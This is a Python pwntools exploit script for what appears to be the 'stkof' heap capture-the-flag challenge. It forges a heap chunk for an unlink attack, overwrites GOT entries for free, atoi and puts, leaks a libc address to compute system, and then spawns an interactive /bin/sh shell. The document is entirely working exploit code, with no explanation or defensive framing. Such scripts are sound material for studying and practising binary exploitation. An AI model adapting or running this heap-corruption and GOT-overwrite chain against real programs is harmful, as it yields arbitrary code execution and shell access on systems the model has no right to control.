from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./stkof"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def add(size):
    p.sendline("1")
    p.sendline(str(size))
    # p.recvuntil("OK\n")

def free(idx):
    p.sendline("3")
    p.sendline(str(idx))
    # p.recvuntil("OK\n")

def edit(idx,content):
    p.sendline("2")
    p.sendline(str(idx))
    p.sendline(str(len(content)))
    p.send(str(content))
    # p.recvuntil("OK\n")

add(4)
add(0x40-8)
add(0xa0-8)

x = 0x602150
payload = flat([
    0,0x20, # prev_size , size
    x-0x18,x-0x10, # fd,bk
    0x20,"a"*8,# next chunk prev_size ,size
    0x30,0xa0
    ])

edit(2,payload)
free(3)

# write got
payload = flat([
    "a"*8,
    elf.got["free"],
    elf.got["atoi"],
    elf.got["puts"]
    ])

edit(2,payload)
payload = flat([
    elf.plt["puts"]
    ])
edit(0,payload)
free(2)
p.recv(27)
puts_addr = u64(p.recv(6).ljust(8,"\0"))
system_addr = puts_addr - libc.sym["puts"] + libc.sym["system"]

edit(1,p64(system_addr))
p.sendline("/bin/sh")

# gdb.attach(p,"set $h=0xe06440,$g=0x602140")

p.interactive()
